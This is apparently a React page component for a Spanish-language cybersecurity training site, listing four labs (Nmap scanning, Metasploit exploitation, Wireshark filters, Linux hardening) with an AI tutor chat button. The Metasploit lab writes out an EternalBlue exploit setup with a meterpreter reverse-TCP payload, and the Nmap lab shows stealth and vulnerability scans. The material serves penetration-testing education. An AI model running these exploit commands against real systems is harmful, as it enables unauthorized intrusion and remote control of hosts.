"use client"

import { useState } from "react"
import Link from "next/link"
import { ArrowLeft, Shield, Terminal, CheckCircle2, MessageCircle } from "lucide-react"
import MrKuChat from "@/components/mr-ku-chat"

export default function CiberseguridadLabPage() {
  const [showChat, setShowChat] = useState(false)
  const [chatMessage, setChatMessage] = useState("")

  const handleAskMrKu = (message: string) => {
    setChatMessage(message)
    setShowChat(true)
  }

  const labs = [
    {
      title: "Reconocimiento con Nmap",
      difficulty: "Principiante",
      duration: "30 min",
      description: "Aprende a realizar escaneos de red y descubrir servicios vulnerables con Nmap.",
      steps: [
        "Instala Nmap en tu sistema",
        "Realiza un escaneo básico de puertos",
        "Detecta versiones de servicios",
        "Identifica sistemas operativos",
      ],
      code: `# Escaneo básico de puertos
nmap -sV 192.168.1.1

# Escaneo completo con detección de OS
nmap -A -T4 192.168.1.0/24

# Escaneo de vulnerabilidades
nmap --script vuln 192.168.1.1

# Escaneo sigiloso (SYN scan)
sudo nmap -sS -p- 192.168.1.1`,
      askMessage: "Mr Ku, ayúdame a entender cómo usar Nmap para reconocimiento de red.",
    },
    {
      title: "Explotación con Metasploit",
      difficulty: "Intermedio",
      duration: "90 min",
      description: "Domina el framework Metasploit para realizar pruebas de penetración controladas.",
      steps: [
        "Configura Metasploit Framework",
        "Busca exploits para vulnerabilidades conocidas",
        "Configura payloads y listeners",
        "Ejecuta el exploit y obtén acceso",
      ],
      code: `# Iniciar Metasploit
msfconsole

# Buscar exploits
search type:exploit platform:windows

# Usar un exploit específico
use exploit/windows/smb/ms17_010_eternalblue

# Configurar opciones
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Ejecutar exploit
exploit`,
      askMessage: "Mr Ku, guíame paso a paso en el uso de Metasploit para pentesting.",
    },
    {
      title: "Análisis de Tráfico con Wireshark",
      difficulty: "Intermedio",
      duration: "60 min",
      description: "Captura y analiza tráfico de red para detectar anomalías y ataques.",
      steps: [
        "Configura la interfaz de captura",
        "Aplica filtros para aislar tráfico relevante",
        "Analiza protocolos y payloads",
        "Identifica patrones de ataque",
      ],
      code: `# Filtros útiles en Wireshark

# Filtrar por IP
ip.addr == 192.168.1.100

# Filtrar tráfico HTTP
http

# Filtrar por puerto
tcp.port == 443

# Detectar escaneos de puertos
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Filtrar tráfico DNS
dns`,
      askMessage: "Mr Ku, enséñame a analizar tráfico de red con Wireshark.",
    },
    {
      title: "Hardening de Servidores Linux",
      difficulty: "Avanzado",
      duration: "120 min",
      description: "Aprende a asegurar servidores Linux siguiendo las mejores prácticas de seguridad.",
      steps: [
        "Configura firewall con iptables/ufw",
        "Implementa fail2ban contra ataques de fuerza bruta",
        "Configura SSH de forma segura",
        "Audita el sistema con Lynis",
      ],
      code: `# Configurar UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# Configurar SSH seguro (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 2222

# Instalar y configurar fail2ban
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Auditar con Lynis
sudo lynis audit system`,
      askMessage: "Mr Ku, ayúdame a hacer hardening de mi servidor Linux.",
    },
  ]

  return (
    <>
      <div className="min-h-screen bg-background">
        {/* Header */}
        <header className="border-b border-border">
          <div className="max-w-6xl mx-auto px-4 py-6">
            <Link
              href="/labs"
              className="inline-flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors mb-4"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Volver a Labs</span>
            </Link>
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#ff007a] to-[#0070f3] p-0.5">
                <div className="w-full h-full bg-background rounded-xl flex items-center justify-center">
                  <Shield className="w-6 h-6" />
                </div>
              </div>
              <div>
                <h1 className="text-3xl font-bold">Laboratorios de Ciberseguridad</h1>
                <p className="text-muted-foreground">Pentesting, análisis de vulnerabilidades y hardening</p>
              </div>
            </div>
          </div>
        </header>

        {/* Labs List */}
        <div className="max-w-6xl mx-auto px-4 py-12">
          <div className="space-y-8">
            {labs.map((lab, index) => (
              <div
                key={index}
                className="bg-card border border-border rounded-2xl p-8 hover:border-[#ff007a] transition-all"
              >
                {/* Lab Header */}
                <div className="flex items-start justify-between mb-6">
                  <div>
                    <div className="flex items-center gap-3 mb-2">
                      <h2 className="text-2xl font-bold">{lab.title}</h2>
                      <span
                        className={`text-xs font-mono px-3 py-1 rounded-full ${
                          lab.difficulty === "Principiante"
                            ? "bg-[#00ff99]/20 text-[#00ff99]"
                            : lab.difficulty === "Intermedio"
                              ? "bg-[#0070f3]/20 text-[#0070f3]"
                              : "bg-[#ff007a]/20 text-[#ff007a]"
                        }`}
                      >
                        {lab.difficulty}
                      </span>
                    </div>
                    <p className="text-muted-foreground mb-2">{lab.description}</p>
                    <div className="flex items-center gap-2 text-sm text-muted-foreground">
                      <Terminal className="w-4 h-4" />
                      <span>{lab.duration}</span>
                    </div>
                  </div>
                </div>

                {/* Steps */}
                <div className="mb-6">
                  <h3 className="font-bold mb-3 flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5 text-[#00ff99]" />
                    Pasos del laboratorio
                  </h3>
                  <ol className="space-y-2 ml-7">
                    {lab.steps.map((step, stepIndex) => (
                      <li key={stepIndex} className="text-muted-foreground">
                        <span className="text-[#ff007a] font-mono mr-2">{stepIndex + 1}.</span>
                        {step}
                      </li>
                    ))}
                  </ol>
                </div>

                {/* Code Block */}
                <div className="mb-6">
                  <h3 className="font-bold mb-3 flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-[#00ff99]" />
                    Comandos y configuración
                  </h3>
                  <pre className="bg-black/50 border border-[#00ff99]/20 rounded-xl p-4 overflow-x-auto">
                    <code className="text-[#00ff99] font-mono text-sm whitespace-pre">{lab.code}</code>
                  </pre>
                </div>

                {/* Ask Mr Ku Button */}
                <button
                  onClick={() => handleAskMrKu(lab.askMessage)}
                  className="w-full bg-gradient-to-r from-[#ff007a] to-[#0070f3] hover:opacity-90 text-white font-bold py-3 px-6 rounded-xl transition-all flex items-center justify-center gap-2"
                >
                  <MessageCircle className="w-5 h-5" />
                  Explícamelo Mr Ku
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Conditional Chat */}
      {showChat && <MrKuChat initialMessage={chatMessage} autoOpen={true} />}
    </>
  )
}
